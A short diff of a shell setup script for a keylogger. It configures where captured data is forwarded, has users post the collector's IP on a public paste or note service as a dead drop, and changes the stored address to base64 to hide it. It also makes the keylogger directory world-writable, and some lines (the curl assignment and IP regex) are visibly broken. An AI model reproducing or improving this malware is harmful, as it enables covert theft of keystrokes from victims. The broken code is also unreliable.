@@ -35,7 +35,7 @@ if [ $(cat $FORWARDFILE) = "forward:true" ];
 		read iptype
 		if [ "$iptype" = 'd' ] ||  [ "$iptype" = 'D' ];
 			then
-			echo "iptype:dynamic" > $IPFILE
+			echo -n "iptype:dynamic" > $IPFILE
 			echo "Please use a free service like https://www.ghostbin.com/ or https://simplenote.com/ to make a note to put your local IP address in";
 			echo "Be sure to create an account so you can edit it later. Make the title of the note something other than your local IP address. something like this:";
 			echo "https://app.simplenote.com/publish/lSr4dF";
@@ -47,7 +47,7 @@ if [ $(cat $FORWARDFILE) = "forward:true" ];
 			echo "iptype:static" > $IPFILE
 			echo "What is the IP address to connect to?"
 			read ipurl
-			echo $ipurl > $IPRAW
+			echo -n $ipurl | base64 > $IPRAW
 			setup
 		fi
 	fi
@@ -57,7 +57,7 @@ setup
 chmod 777 -R $HOME/.keylogger
 if [ -f $IPRAW ];
 	then
-	ipaddr=$(cat $IPRAW)
+	ipaddr=$(cat $IPRAW | base64 --decode)
 else
 	ipaddr=curl $(cat '$IPURLFILE') 2>&1 | grep -oP '\d+\.\d+\.\d\.\d'
 fi
